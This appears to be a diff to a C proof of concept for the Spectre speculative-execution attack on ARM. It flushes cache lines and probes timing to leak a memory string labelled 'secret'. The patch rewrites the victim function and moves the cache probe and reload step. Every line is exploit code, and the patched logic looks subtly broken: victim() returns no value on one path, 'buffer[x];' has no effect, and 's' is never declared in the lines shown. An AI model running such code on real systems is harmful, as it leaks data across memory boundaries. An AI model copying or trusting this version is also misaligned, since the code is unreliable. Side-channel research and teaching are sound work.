@@ -11,6 +11,7 @@ u_int8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
 u_int8_t temp = 0;
 char*secret = "Some Secret Value";
 u_int8_t array[256*4096];
+int thresh = 0;
 
 static inline void flush(void *addr) {
 	asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (addr));
@@ -49,10 +50,12 @@ void flushSideChannel()
   for (i = 0; i < 256; i++) flush(&array[i*4096 +DELTA]);
 }
 
-void victim(size_t x){
-  if (x < buffer_size)
-  {
-    array[buffer[x]*4096 + DELTA] = 10;
+int victim(size_t x){
+  if (x < buffer_size){
+    //array[buffer[x]*4096 + DELTA] = 10;
+    buffer[x];
+  } else {
+    return 0;
   }
 }
 
@@ -81,11 +84,16 @@ void spectre(size_t offset){
   flush(&buffer_size);
   flushSideChannel();
 
-  victim(offset);
+  // Restricted access
+  // Secret will be loaded due to speculative attack
+  s = victim(offset);
+  array[s*4096 + DELTA] += 88; 
+
+  reloadSideChannel(thresh);
 }
 
 int main(int argc, const char**argv){
-  int thresh = atoi(argv[1]);
+  thresh = atoi(argv[1]);
   printf("%p\n",(void*)&secret);
   printf("%p\n",(void*)&buffer);
   printf("%p\n",(void*)&array);
@@ -100,7 +108,5 @@ int main(int argc, const char**argv){
 
   size_t larger_x = (size_t)(secret - (char*)buffer);
   spectre(larger_x);
-
-  reloadSideChannel(thresh);
   return (0);
 }
